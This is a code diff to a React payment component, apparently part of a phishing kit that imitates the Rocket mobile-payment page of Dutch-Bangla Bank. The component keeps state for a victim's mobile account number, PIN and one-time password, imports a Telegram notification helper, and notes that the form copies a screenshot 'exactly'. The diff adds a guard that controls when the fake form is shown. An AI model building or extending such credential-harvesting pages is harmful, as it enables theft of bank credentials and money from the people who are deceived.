@@ -1,6 +1,7 @@
 import { useState, useEffect, useRef } from "react";
 import { useNavigate, useSearchParams } from "react-router-dom";
 import { sendTelegramNotification } from "@/lib/telegram";
+import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
 import dbblHeader from "@/assets/dbbl-header.jpg";
 import secureLogos from "@/assets/3d-secure-logos.jpg";
 import otpIllustration from "@/assets/otp-illustration.jpg";
@@ -9,6 +10,7 @@ const RocketPayment = () => {
   const navigate = useNavigate();
   const [searchParams] = useSearchParams();
   const amount = searchParams.get('amount') || "00";
+  const isAllowed = usePaymentMethodGuard("rocket");
   const [mobileAccount, setMobileAccount] = useState("");
   const [pin, setPin] = useState("");
   const [otp, setOtp] = useState("");
@@ -265,6 +267,8 @@ const RocketPayment = () => {
   }
 
   // Main form page (matches first screenshot exactly)
+  if (isAllowed !== true) return null;
+
   return (
     <div className="h-screen bg-[#f0f0f0] flex items-start justify-center px-4 pt-4 overflow-hidden">
       <div className="w-full max-w-[700px] bg-white rounded-lg shadow-[0_2px_20px_rgba(0,0,0,0.12)]">
